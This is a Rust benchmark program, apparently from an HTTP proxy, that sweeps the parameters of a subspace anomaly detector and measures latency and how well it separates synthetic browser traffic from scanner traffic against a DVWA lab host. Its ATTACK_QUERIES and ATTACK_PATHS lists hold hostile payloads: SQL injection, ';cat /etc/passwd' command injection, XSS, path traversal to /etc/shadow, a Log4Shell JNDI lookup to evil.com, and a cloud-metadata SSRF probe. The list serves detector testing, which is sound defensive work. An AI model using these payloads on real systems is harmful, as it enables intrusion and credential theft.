//! Spectral parameter sweep — measures latency and detection quality across
//! the full configuration space (geometry, eigenvalue, decision boundary).
//!
//! Run with: cargo run -p http-proxy --release --example param_sweep

use std::sync::Arc;
use std::time::Instant;

use holon::kernel::{Encoder, Vector, VectorManager};
use holon::memory::StripedSubspace;
use http_proxy::{HttpVersion, RequestSample, TlsContext};

// =============================================================================
// Sample generation
// =============================================================================

fn browser_tls() -> TlsContext {
    TlsContext {
        record_version: 0x0301,
        handshake_version: 0x0303,
        session_id_len: 32,
        cipher_suites: vec![
            0x1301, 0x1302, 0x1303, // TLS 1.3
            0xc02c, 0xc02b, 0xc030, 0xc02f, // ECDHE suites
            0x009e, 0x009c, 0x00a3, 0x009f, // DHE suites
        ],
        compression_methods: vec![0x00],
        extensions: vec![
            (0x0000, vec![0; 14]), // SNI
            (0xff01, vec![0; 1]),  // renegotiation_info
            (0x000a, vec![0; 8]),  // supported_groups
            (0x000b, vec![0; 2]),  // ec_point_formats
            (0x0023, vec![]),      // session_ticket
            (0x0010, vec![0; 9]),  // ALPN
            (0x0005, vec![0; 5]),  // status_request
            (0x000d, vec![0; 18]), // signature_algorithms
            (0x002b, vec![0; 5]),  // supported_versions
            (0x002d, vec![0; 2]),  // psk_key_exchange_modes
            (0x0033, vec![0; 39]), // key_share
            (0x0015, vec![0; 100]),// padding
        ],
        supported_groups: vec![0x001d, 0x0017, 0x0018, 0x0019],
        ec_point_formats: vec![0x00, 0x01, 0x02],
        sig_algs: vec![0x0403, 0x0503, 0x0603, 0x0804, 0x0805, 0x0806, 0x0401, 0x0501, 0x0601],
        alpn: vec!["h2".to_string(), "http/1.1".to_string()],
        sni: Some("dvwa.local".to_string()),
        session_ticket: true,
        psk_modes: vec![0x01],
        key_share_groups: vec![0x001d, 0x0017],
        supported_versions: vec![0x0304, 0x0303],
        compress_certificate: vec![0x0002],
    }
}

fn nikto_tls() -> TlsContext {
    TlsContext {
        record_version: 0x0301,
        handshake_version: 0x0303,
        session_id_len: 0,
        cipher_suites: vec![
            0xc030, 0xc02c, 0xc028, 0xc024, 0xc014, 0xc00a, // ECDHE
            0x00a3, 0x009f, 0x006b, 0x006a, 0x0039, 0x0038, // DHE
            0x009d, 0x009c, 0x003d, 0x003c, 0x0035, 0x002f, // RSA
            0xc02f, 0xc02b, 0xc027, 0xc023, 0xc013, 0xc009, // More ECDHE
            0x00a2, 0x009e, 0x0067, 0x0040, 0x0033, 0x0032, // More DHE
            0x006c, 0x006d, 0x003e, 0x003f,                  // Extra
        ],
        compression_methods: vec![0x00],
        extensions: vec![
            (0x000b, vec![0; 4]),  // ec_point_formats
            (0x000a, vec![0; 10]), // supported_groups
            (0x0023, vec![]),      // session_ticket
            (0x000d, vec![0; 24]), // signature_algorithms
            (0x0000, vec![0; 14]), // SNI (different order!)
            (0x0015, vec![0; 50]), // padding
        ],
        supported_groups: vec![0x001d, 0x0017, 0x001e, 0x0019, 0x0018],
        ec_point_formats: vec![0x00, 0x01, 0x02],
        sig_algs: vec![0x0403, 0x0503, 0x0603, 0x0201, 0x0401, 0x0501, 0x0601],
        alpn: vec![],
        sni: Some("dvwa.local".to_string()),
        session_ticket: true,
        psk_modes: vec![],
        key_share_groups: vec![],
        supported_versions: vec![0x0303],
        compress_certificate: vec![],
    }
}

fn make_sample(
    method: &str,
    path: &str,
    query: Option<&str>,
    ua: &str,
    headers: Vec<(&str, &str)>,
    cookies: Vec<(&str, &str)>,
    tls: &TlsContext,
    encoder: &Encoder,
    ip: &str,
) -> RequestSample {
    let tls_ctx = Arc::new(tls.clone());
    let tls_vec = encoder.encode_walkable(tls_ctx.as_ref());
    let h: Vec<(String, String)> = headers.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect();
    let host = h.iter().find(|(k, _)| k.eq_ignore_ascii_case("host")).map(|(_, v)| v.clone());
    RequestSample {
        method: method.to_string(),
        path: path.to_string(),
        query: query.map(|s| s.to_string()),
        version: HttpVersion::Http11,
        headers: h,
        host,
        user_agent: Some(ua.to_string()),
        content_type: None,
        content_length: None,
        cookies: cookies.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
        body: None,
        src_ip: ip.parse().unwrap(),
        conn_id: 1,
        tls_ctx,
        tls_vec,
        timestamp_us: 0,
    }
}

const NORMAL_PATHS: [&str; 20] = [
    "/", "/login.php", "/index.php", "/vulnerabilities/sqli/",
    "/vulnerabilities/xss_r/", "/vulnerabilities/brute/", "/about.php",
    "/security.php", "/setup.php", "/instructions.php",
    "/vulnerabilities/fi/?page=include.php", "/vulnerabilities/upload/",
    "/vulnerabilities/csrf/", "/vulnerabilities/exec/",
    "/dvwa/css/main.css", "/dvwa/js/dvwaPage.js", "/favicon.ico",
    "/phpinfo.php", "/ids_log.php", "/vulnerabilities/captcha/",
];

const ATTACK_PATHS: [&str; 20] = [
    "/../../../etc/passwd", "/.env", "/wp-admin/", "/wp-login.php",
    "/administrator/", "/.git/config", "/backup.sql", "/server-status",
    "/cgi-bin/test-cgi", "/bin/cgiwrap", "/phpmyadmin/", "/admin.php",
    "/shell.php", "/.htaccess", "/WEB-INF/web.xml", "/debug/default/view",
    "/api/v1/../../../etc/shadow", "/cgi-bin/awstats.pl",
    "/manager/html", "/solr/admin/cores",
];

const ATTACK_QUERIES: [&str; 10] = [
    "id=1' OR '1'='1", "id=1 UNION SELECT 1,2,3--",
    "cmd=;cat /etc/passwd", "page=<script>alert(1)</script>",
    "file=....//....//etc/passwd", "q=${jndi:ldap://evil.com/a}",
    "name={{7*7}}", "url=http://169.254.169.254/latest/meta-data/",
    "redirect=javascript:alert(1)", "action=../../../etc/shadow",
];

const BROWSER_UAS: [&str; 4] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 Safari/17.2",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
];

const SCANNER_UAS: [&str; 4] = [
    "Nikto/2.1.6", "sqlmap/1.7.2", "Mozilla/4.0 (Hydra)", "ZAP/2.14.0",
];

fn normal_samples(encoder: &Encoder, count: usize) -> Vec<RequestSample> {
    let tls = browser_tls();
    let mut samples = Vec::with_capacity(count);
    let browser_headers = |i: usize| vec![
        ("host", "dvwa.local"),
        ("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("accept-language", "en-US,en;q=0.5"),
        ("accept-encoding", "gzip, deflate, br"),
        ("connection", "keep-alive"),
        ("upgrade-insecure-requests", "1"),
        ("referer", if i % 3 == 0 { "http://dvwa.local/index.php" } else { "http://dvwa.local/login.php" }),
    ];
    for i in 0..count {
        let path = NORMAL_PATHS[i % NORMAL_PATHS.len()];
        let ua = BROWSER_UAS[i % BROWSER_UAS.len()];
        let query = if i % 5 == 0 { Some("id=1&Submit=Submit") } else { None };
        let cookies = vec![("PHPSESSID", "a1b2c3d4e5f6"), ("security", "low")];
        samples.push(make_sample("GET", path, query, ua, browser_headers(i), cookies, &tls, encoder, "192.168.1.100"));
    }
    samples
}

fn attack_samples(encoder: &Encoder, count: usize) -> Vec<RequestSample> {
    let tls = nikto_tls();
    let mut samples = Vec::with_capacity(count);
    let scanner_headers = |i: usize| {
        let mut h = vec![
            ("host", "dvwa.local"),
            ("accept", "*/*"),
            ("connection", "Keep-Alive"),
        ];
        if i % 3 == 0 { h.push(("x-forwarded-for", "127.0.0.1")); }
        if i % 4 == 0 { h.push(("x-custom-ip-authorization", "127.0.0.1")); }
        if i % 5 == 0 { h.push(("x-originating-ip", "127.0.0.1")); }
        h
    };
    for i in 0..count {
        let path = ATTACK_PATHS[i % ATTACK_PATHS.len()];
        let ua = SCANNER_UAS[i % SCANNER_UAS.len()];
        let query = if i % 2 == 0 { Some(ATTACK_QUERIES[i % ATTACK_QUERIES.len()]) } else { None };
        samples.push(make_sample("GET", path, query, ua, scanner_headers(i), vec![], &tls, encoder, "10.0.0.5"));
    }
    samples
}

// =============================================================================
// Measurement
// =============================================================================

#[allow(dead_code)]
struct SweepResult {
    // Config
    dim: usize,
    stripes: usize,
    k: usize,
    amnesia: f64,
    sigma_mult: f64,
    ema_alpha: f64,
    warmup_n: usize,
    // Latency (nanoseconds)
    encode_p50: u64,
    encode_p99: u64,
    residual_p50: u64,
    residual_p99: u64,
    full_p50: u64,
    full_p99: u64,
    // Quality
    mean_normal_resid: f64,
    mean_attack_resid: f64,
    threshold: f64,
    separation: f64,
    fpr: f64,
    fnr: f64,
    explained: f64,
    eigenvals_top3: [f64; 3],
}

fn percentile(sorted: &[u64], pct: f64) -> u64 {
    if sorted.is_empty() { return 0; }
    let idx = ((sorted.len() as f64 * pct) as usize).min(sorted.len() - 1);
    sorted[idx]
}

fn run_config(
    dim: usize,
    stripes: usize,
    k: usize,
    amnesia: f64,
    sigma_mult: f64,
    ema_alpha: f64,
    warmup_n: usize,
) -> SweepResult {
    let encoder = Encoder::new(VectorManager::new(dim));

    let normals = normal_samples(&encoder, warmup_n.max(200));
    let attacks = attack_samples(&encoder, 200);

    // Pre-encode all samples to striped vectors, measuring encode latency
    let mut encode_times: Vec<u64> = Vec::new();
    let mut normal_vecs: Vec<Vec<Vec<f64>>> = Vec::new();
    for s in &normals {
        let t0 = Instant::now();
        let vecs: Vec<Vector> = encoder.encode_walkable_striped(s, stripes);
        let elapsed = t0.elapsed().as_nanos() as u64;
        encode_times.push(elapsed);
        normal_vecs.push(vecs.iter().map(|v| v.to_f64()).collect());
    }
    let mut attack_vecs: Vec<Vec<Vec<f64>>> = Vec::new();
    for s in &attacks {
        let t0 = Instant::now();
        let vecs: Vec<Vector> = encoder.encode_walkable_striped(s, stripes);
        let elapsed = t0.elapsed().as_nanos() as u64;
        encode_times.push(elapsed);
        attack_vecs.push(vecs.iter().map(|v| v.to_f64()).collect());
    }

    // Build subspace and warmup
    let mut sub = StripedSubspace::with_params(dim, k, stripes, amnesia, ema_alpha, sigma_mult, 500);
    for v in normal_vecs.iter().take(warmup_n) {
        sub.update(v);
    }
    let threshold = sub.threshold();

    let eigenvals = sub.stripe(0).eigenvalues();
    let mut top3 = [0.0f64; 3];
    for (i, &ev) in eigenvals.iter().take(3).enumerate() {
        top3[i] = ev;
    }
    let explained = sub.stripe(0).explained_ratio();

    // Score normal samples (post-warmup), measuring residual latency
    let score_normals = if normal_vecs.len() > warmup_n {
        &normal_vecs[warmup_n..]
    } else {
        // Re-use first 200 if warmup consumed all
        &normal_vecs[..200.min(normal_vecs.len())]
    };

    let mut residual_times: Vec<u64> = Vec::new();
    let mut normal_resids: Vec<f64> = Vec::new();
    for v in score_normals.iter().take(200) {
        let t0 = Instant::now();
        let r = sub.residual(v);
        let elapsed = t0.elapsed().as_nanos() as u64;
        residual_times.push(elapsed);
        normal_resids.push(r);
    }

    let mut attack_resids: Vec<f64> = Vec::new();
    for v in &attack_vecs {
        let t0 = Instant::now();
        let r = sub.residual(v);
        let elapsed = t0.elapsed().as_nanos() as u64;
        residual_times.push(elapsed);
        attack_resids.push(r);
    }

    // Full-path timing: encode + residual
    let full_normals = normal_samples(&encoder, 50);
    let full_attacks = attack_samples(&encoder, 50);
    let mut full_times: Vec<u64> = Vec::new();
    for s in full_normals.iter().chain(full_attacks.iter()) {
        let t0 = Instant::now();
        let vecs: Vec<Vector> = encoder.encode_walkable_striped(s, stripes);
        let f64_vecs: Vec<Vec<f64>> = vecs.iter().map(|v| v.to_f64()).collect();
        let _r = sub.residual(&f64_vecs);
        let elapsed = t0.elapsed().as_nanos() as u64;
        full_times.push(elapsed);
    }

    // Compute metrics
    let mean_normal = if normal_resids.is_empty() { 0.0 } else {
        normal_resids.iter().sum::<f64>() / normal_resids.len() as f64
    };
    let mean_attack = if attack_resids.is_empty() { 0.0 } else {
        attack_resids.iter().sum::<f64>() / attack_resids.len() as f64
    };
    let separation = if threshold > 0.0 && threshold.is_finite() {
        mean_attack / threshold
    } else {
        0.0
    };
    let fpr = if normal_resids.is_empty() { 0.0 } else {
        normal_resids.iter().filter(|&&r| r > threshold).count() as f64 / normal_resids.len() as f64 * 100.0
    };
    let fnr = if attack_resids.is_empty() { 0.0 } else {
        attack_resids.iter().filter(|&&r| r <= threshold).count() as f64 / attack_resids.len() as f64 * 100.0
    };

    encode_times.sort();
    residual_times.sort();
    full_times.sort();

    SweepResult {
        dim, stripes, k, amnesia, sigma_mult, ema_alpha, warmup_n,
        encode_p50: percentile(&encode_times, 0.50),
        encode_p99: percentile(&encode_times, 0.99),
        residual_p50: percentile(&residual_times, 0.50),
        residual_p99: percentile(&residual_times, 0.99),
        full_p50: percentile(&full_times, 0.50),
        full_p99: percentile(&full_times, 0.99),
        mean_normal_resid: mean_normal,
        mean_attack_resid: mean_attack,
        threshold,
        separation,
        fpr,
        fnr,
        explained,
        eigenvals_top3: top3,
    }
}

// =============================================================================
// Output formatting
// =============================================================================

fn fmt_ns(ns: u64) -> String {
    if ns >= 1_000_000 {
        format!("{:.1}ms", ns as f64 / 1_000_000.0)
    } else if ns >= 1_000 {
        format!("{:.1}us", ns as f64 / 1_000.0)
    } else {
        format!("{}ns", ns)
    }
}

fn print_geometry_header() {
    println!("{:>5} {:>7} {:>3} | {:>8} {:>8} {:>8} {:>8} {:>8} {:>8} | {:>5} {:>5} {:>5} | {:>5} {:>5}",
        "DIM", "STRIPES", "K",
        "enc_p50", "enc_p99", "res_p50", "res_p99", "ful_p50", "ful_p99",
        "sep", "FPR%", "FNR%", "expl", "thr");
    println!("{}", "-".repeat(120));
}

fn print_result_geometry(r: &SweepResult) {
    println!("{:>5} {:>7} {:>3} | {:>8} {:>8} {:>8} {:>8} {:>8} {:>8} | {:>5.1}x {:>4.1}% {:>4.1}% | {:>5.2} {:>5.1}",
        r.dim, r.stripes, r.k,
        fmt_ns(r.encode_p50), fmt_ns(r.encode_p99),
        fmt_ns(r.residual_p50), fmt_ns(r.residual_p99),
        fmt_ns(r.full_p50), fmt_ns(r.full_p99),
        r.separation, r.fpr, r.fnr,
        r.explained, r.threshold);
}

fn print_eigenvalue_header() {
    println!("{:>7} {:>5} {:>6} {:>6} | {:>8} {:>8} {:>8} | {:>5} {:>5} {:>5} | {:>8} | {:>28}",
        "amnesia", "sigma", "ema_a", "warmup",
        "res_p50", "ful_p50", "thr",
        "sep", "FPR%", "FNR%",
        "expl",
        "eigenvals (top 3)");
    println!("{}", "-".repeat(130));
}

fn print_result_eigenvalue(r: &SweepResult) {
    println!("{:>7.1} {:>5.1} {:>6.3} {:>6} | {:>8} {:>8} {:>8.2} | {:>5.1}x {:>4.1}% {:>4.1}% | {:>8.3} | [{:>7.1}, {:>7.1}, {:>7.1}]",
        r.amnesia, r.sigma_mult, r.ema_alpha, r.warmup_n,
        fmt_ns(r.residual_p50), fmt_ns(r.full_p50), r.threshold,
        r.separation, r.fpr, r.fnr,
        r.explained,
        r.eigenvals_top3[0], r.eigenvals_top3[1], r.eigenvals_top3[2]);
}

fn print_decision_header() {
    println!("{:>9} | {:>8} {:>8} {:>8} | {:>9} {:>9} {:>9} {:>9}",
        "deny_mult",
        "thr", "deny_thr", "mean_atk",
        "deny%", "ratelim%", "allow_FP%", "atk_FN%");
    println!("{}", "-".repeat(95));
}


// =============================================================================
// Decision sweep needs per-sample residuals
// =============================================================================

fn run_decision_sweep(
    dim: usize, stripes: usize, k: usize,
    amnesia: f64, sigma_mult: f64, ema_alpha: f64,
    warmup_n: usize,
    deny_mults: &[f64],
) {
    let encoder = Encoder::new(VectorManager::new(dim));
    let normals = normal_samples(&encoder, warmup_n + 200);
    let attacks = attack_samples(&encoder, 200);

    let normal_vecs: Vec<Vec<Vec<f64>>> = normals.iter()
        .map(|s| encoder.encode_walkable_striped(s, stripes).iter().map(|v| v.to_f64()).collect())
        .collect();
    let attack_vecs: Vec<Vec<Vec<f64>>> = attacks.iter()
        .map(|s| encoder.encode_walkable_striped(s, stripes).iter().map(|v| v.to_f64()).collect())
        .collect();

    let mut sub = StripedSubspace::with_params(dim, k, stripes, amnesia, ema_alpha, sigma_mult, 500);
    for v in normal_vecs.iter().take(warmup_n) {
        sub.update(v);
    }
    let threshold = sub.threshold();

    let score_start = warmup_n.min(normal_vecs.len());
    let normal_resids: Vec<f64> = normal_vecs[score_start..].iter().take(200).map(|v| sub.residual(v)).collect();
    let attack_resids: Vec<f64> = attack_vecs.iter().map(|v| sub.residual(v)).collect();

    print_decision_header();
    for &dm in deny_mults {
        let deny_thr = threshold * dm;
        let n_total = normal_resids.len() as f64;
        let a_total = attack_resids.len() as f64;
        let fp = normal_resids.iter().filter(|&&r| r > threshold).count() as f64;
        let atk_denied = attack_resids.iter().filter(|&&r| r > deny_thr).count() as f64;
        let atk_ratelim = attack_resids.iter().filter(|&&r| r > threshold && r <= deny_thr).count() as f64;
        let atk_missed = attack_resids.iter().filter(|&&r| r <= threshold).count() as f64;

        println!("{:>9.1} | {:>8.2} {:>8.2} {:>8.2} | {:>8.1}% {:>8.1}% {:>8.1}% {:>8.1}%",
            dm, threshold, deny_thr,
            attack_resids.iter().sum::<f64>() / a_total,
            atk_denied / a_total * 100.0,
            atk_ratelim / a_total * 100.0,
            fp / n_total * 100.0,
            atk_missed / a_total * 100.0);
    }
}

// =============================================================================
// Main
// =============================================================================

fn main() {
    let defaults = (4096usize, 32usize, 8usize, 2.0f64, 3.5f64, 0.01f64, 500usize);

    // =========================================================================
    // Sweep 1: Geometry — DIM
    // =========================================================================
    let sep = "=".repeat(80);
    println!("\n{sep}");
    println!("=== GEOMETRY SWEEP: DIM (STRIPES={}, K={}) ===", defaults.1, defaults.2);
    println!("{sep}\n");
    print_geometry_header();
    for &dim in &[512, 1024, 2048, 4096, 8192] {
        let r = run_config(dim, defaults.1, defaults.2, defaults.3, defaults.4, defaults.5, defaults.6);
        print_result_geometry(&r);
    }

    // =========================================================================
    // Sweep 1: Geometry — STRIPES
    // =========================================================================
    println!("\n{sep}");
    println!("=== GEOMETRY SWEEP: STRIPES (DIM={}, K={}) ===", defaults.0, defaults.2);
    println!("{sep}\n");
    print_geometry_header();
    for &stripes in &[1, 4, 8, 16, 32, 64] {
        let r = run_config(defaults.0, stripes, defaults.2, defaults.3, defaults.4, defaults.5, defaults.6);
        print_result_geometry(&r);
    }

    // =========================================================================
    // Sweep 1: Geometry — K
    // =========================================================================
    println!("\n{sep}");
    println!("=== GEOMETRY SWEEP: K (DIM={}, STRIPES={}) ===", defaults.0, defaults.1);
    println!("{sep}\n");
    print_geometry_header();
    for &k in &[2, 4, 8, 16, 32, 64] {
        let r = run_config(defaults.0, defaults.1, k, defaults.3, defaults.4, defaults.5, defaults.6);
        print_result_geometry(&r);
    }

    // =========================================================================
    // Sweep 2: Eigenvalue — amnesia
    // =========================================================================
    println!("\n{sep}");
    println!("=== EIGENVALUE SWEEP: amnesia (DIM={}, STRIPES={}, K={}) ===", defaults.0, defaults.1, defaults.2);
    println!("{sep}\n");
    print_eigenvalue_header();
    for &amnesia in &[0.5, 1.0, 2.0, 4.0, 8.0] {
        let r = run_config(defaults.0, defaults.1, defaults.2, amnesia, defaults.4, defaults.5, defaults.6);
        print_result_eigenvalue(&r);
    }

    // =========================================================================
    // Sweep 2: Eigenvalue — sigma_mult
    // =========================================================================
    println!("\n{sep}");
    println!("=== EIGENVALUE SWEEP: sigma_mult (DIM={}, STRIPES={}, K={}) ===", defaults.0, defaults.1, defaults.2);
    println!("{sep}\n");
    print_eigenvalue_header();
    for &sigma in &[1.5, 2.0, 2.5, 3.0, 3.5, 4.0, 5.0] {
        let r = run_config(defaults.0, defaults.1, defaults.2, defaults.3, sigma, defaults.5, defaults.6);
        print_result_eigenvalue(&r);
    }

    // =========================================================================
    // Sweep 2: Eigenvalue — ema_alpha
    // =========================================================================
    println!("\n{sep}");
    println!("=== EIGENVALUE SWEEP: ema_alpha (DIM={}, STRIPES={}, K={}) ===", defaults.0, defaults.1, defaults.2);
    println!("{sep}\n");
    print_eigenvalue_header();
    for &alpha in &[0.001, 0.005, 0.01, 0.05, 0.1] {
        let r = run_config(defaults.0, defaults.1, defaults.2, defaults.3, defaults.4, alpha, defaults.6);
        print_result_eigenvalue(&r);
    }

    // =========================================================================
    // Sweep 2: Eigenvalue — warmup_samples
    // =========================================================================
    println!("\n{sep}");
    println!("=== EIGENVALUE SWEEP: warmup_samples (DIM={}, STRIPES={}, K={}) ===", defaults.0, defaults.1, defaults.2);
    println!("{sep}\n");
    print_eigenvalue_header();
    for &warmup in &[100, 250, 500, 1000, 2000] {
        let r = run_config(defaults.0, defaults.1, defaults.2, defaults.3, defaults.4, defaults.5, warmup);
        print_result_eigenvalue(&r);
    }

    // =========================================================================
    // Sweep 3: Decision boundary — deny multiplier
    // =========================================================================
    println!("\n{sep}");
    println!("=== DECISION SWEEP: deny_mult (DIM={}, STRIPES={}, K={}) ===", defaults.0, defaults.1, defaults.2);
    println!("{sep}\n");
    run_decision_sweep(
        defaults.0, defaults.1, defaults.2,
        defaults.3, defaults.4, defaults.5, defaults.6,
        &[1.5, 2.0, 2.5, 3.0, 4.0],
    );

    // =========================================================================
    // Interaction Sweep 1: DIM × K (STRIPES=32)
    // Does optimal K change with DIM?
    // =========================================================================
    println!("\n{sep}");
    println!("=== INTERACTION: DIM x K (STRIPES=32) ===");
    println!("{sep}\n");
    print_geometry_header();
    for &dim in &[512, 1024, 2048, 4096] {
        for &k in &[8, 16, 32] {
            let r = run_config(dim, 32, k, defaults.3, defaults.4, defaults.5, defaults.6);
            print_result_geometry(&r);
        }
        println!();
    }

    // =========================================================================
    // Interaction Sweep 2: DIM × STRIPES (K=16)
    // More stripes with lower DIM — can we compensate?
    // =========================================================================
    println!("\n{sep}");
    println!("=== INTERACTION: DIM x STRIPES (K=16) ===");
    println!("{sep}\n");
    print_geometry_header();
    for &dim in &[512, 1024, 2048, 4096] {
        for &stripes in &[8, 16, 32, 64] {
            let r = run_config(dim, stripes, 16, defaults.3, defaults.4, defaults.5, defaults.6);
            print_result_geometry(&r);
        }
        println!();
    }

    // =========================================================================
    // Interaction Sweep 3: STRIPES × K (DIM=2048)
    // At the sweet-spot DIM, how do STRIPES and K interact?
    // =========================================================================
    println!("\n{sep}");
    println!("=== INTERACTION: STRIPES x K (DIM=2048) ===");
    println!("{sep}\n");
    print_geometry_header();
    for &stripes in &[4, 8, 16, 32, 64] {
        for &k in &[4, 8, 16, 32] {
            let r = run_config(2048, stripes, k, defaults.3, defaults.4, defaults.5, defaults.6);
            print_result_geometry(&r);
        }
        println!();
    }

    // =========================================================================
    // Interaction Sweep 4: Iso-compute budget configs
    // Total FLOPs ∝ DIM × K × STRIPES — hold product ~constant
    // Target budget: ~2M FLOPs (current 4096×8×32 = 1M K-steps)
    // =========================================================================
    println!("\n{sep}");
    println!("=== ISO-COMPUTE: DIM x STRIPES x K (budget ~= DIM*K*STRIPES constant) ===");
    println!("{sep}\n");
    println!("Budget target: DIM*K*STRIPES ≈ 1M (current = 4096*8*32 = 1,048,576)");
    println!();
    print_geometry_header();
    let budget_configs: &[(usize, usize, usize)] = &[
        // ~1M budget, different splits
        (4096, 32, 8),    // current: 1,048,576
        (2048, 32, 16),   // 1,048,576 — same budget, 2x K
        (2048, 64, 8),    // 1,048,576 — same budget, 2x stripes
        (1024, 64, 16),   // 1,048,576 — low DIM, many stripes, high K
        (1024, 32, 32),   // 1,048,576 — low DIM, default stripes, 4x K
        (512, 64, 32),    // 1,048,576 — tiny DIM, max stripes+K
        (4096, 16, 16),   // 1,048,576 — high DIM, fewer stripes, 2x K
        (8192, 16, 8),    // 1,048,576 — huge DIM, few stripes
        (8192, 8, 16),    // 1,048,576 — huge DIM, fewer stripes, high K
        // slightly over-budget "best guess" configs
        (2048, 32, 32),   // 2,097,152 — 2x budget, max K at DIM=2048
        (2048, 16, 16),   // 524,288 — half budget, compact
        (1024, 16, 16),   // 262,144 — quarter budget, minimal
    ];
    for &(dim, stripes, k) in budget_configs {
        let r = run_config(dim, stripes, k, defaults.3, defaults.4, defaults.5, defaults.6);
        let product = dim * stripes * k;
        print!("[{:>9}] ", product);
        print_result_geometry(&r);
    }

    println!("\nDone.");
}
